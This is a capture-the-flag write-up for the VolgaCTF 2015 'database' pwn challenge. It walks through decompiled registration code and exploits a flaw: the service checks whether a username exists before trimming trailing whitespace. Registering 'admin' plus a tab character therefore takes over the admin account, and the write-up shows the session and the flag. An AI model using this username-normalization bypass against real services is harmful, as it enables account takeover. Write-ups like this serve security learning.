# VolgaCTF 2015: database

**Category:** Pwn
**Points:** 75
**Description:** 

> *hack the [database](challenge/database)!*
>
> *nc database.2015.volgactf.ru 7777*


Its a telnet-service listening on port 7777

In the non-stripped binary we see a couple of functions, when looking at process_connection we see a few possible commands:

get_flag
whoami
login
register
get_info
set_info
logout
exit

Lets first try get_flag

> This command is prohibited to non-admin users.


Okay, lets try to register admin:
> register admin a
> This user is already exists.

Hmm lets look at the register_user function in the binary

    LODWORD(userExists) = g_hash_table_lookup(users, cmd_arg1);
    if ( userExists )
    {
      user_exists_len = strlen(user_exists);
      result = send(SocketFD, user_exists, user_exists_len, 0);
    }
    else
    {
      result = (ssize_t)insert_new_user(cmd_arg1_ref1, cmd_arg2_ref1, 0LL);
      *(_QWORD *)ref_result = result;
    }


So it first checks if the input-string does not already exist as a username and then calls 'insert_new_user'


  username_buf = (char *)calloc(0x40uLL, 1uLL);
  username_after_rtrim = rtrim((const char *)username);
  strncpy(username_buf, username_after_rtrim, 0x40uLL);
  username_buf[64] = 0;
  password_buf = (char *)calloc(0x80uLL, 1uLL);
  password_after_rtrim = rtrim((const char *)password);
  strncpy(password_buf, password_after_rtrim, 0x40uLL);
  password_buf[64] = 0;
  if ( v7 )
  {
    v5 = rtrim((const char *)v7);
    strncpy(password_buf + 64, v5, 0x40uLL);
    password_buf[128] = 0;
  }
  g_hash_table_insert(users, username_buf, password_buf);



So first, the input-string is checked if it does not exist as a username already, and if not, the username gets trimmed' with rtrim(); and inserted into the database.. seems like a vulnerability to me: we can insert something like admin\t, which when checked does not exist, but rtrim proceeds to remove the \t character so we end up inserting 'admin'. Let's try that: simply print a tab-character in your terminal and copy it: 
 $perl -e 'print "\t"'

 then register admin\t a

 and you're logged in as admin:


>> register admin	 a
>> whoami
You are admin.
>> get_flag
flag: {does_it_look_like_column_tr@ncation}